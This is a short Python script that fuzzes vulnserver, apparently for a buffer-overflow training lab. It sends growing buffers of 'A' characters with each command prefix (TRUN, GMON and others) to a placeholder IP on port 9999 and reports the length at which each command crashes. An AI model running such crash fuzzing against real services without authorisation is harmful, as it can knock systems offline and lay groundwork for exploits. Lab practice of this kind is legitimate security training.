#!/usr/bin/env python3
import socket, time, sys

ip = "MACHINE_IP"
port = 9999
timeout = 5


prefixes = [b'STATS ', b'RTIME ', b'LTIME ', b'SRUN ', b'TRUN ', b'GMON ', \
            b'GDOG ', b'KSTET ', b'GTER ', b'HTER ', b'LTER ', b'KSTAN ']

buffer = []
counter = 100
while len(buffer) < 1000:
    buffer.append(b"A" * counter)
    counter += 100

results = {}

for prefix in prefixes:
    stringfix = str(prefix, 'utf-8')[:-1]
    print('FUZZING {}'.format(stringfix))
    for string in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            connect = s.connect((ip, port))
            s.recv(1024)
            s.send(prefix + string + b"\r\n")
            s.recv(1024)
            s.close()
        except:
            results[stringfix] = len(string)
            input('Restart vulnserver and press enter')
            break
    time.sleep(.3)
time.sleep(1)
for key in results:
    print('Command {} crashed after {} bytes'.format(key, results[key]))
sys.exit(0)
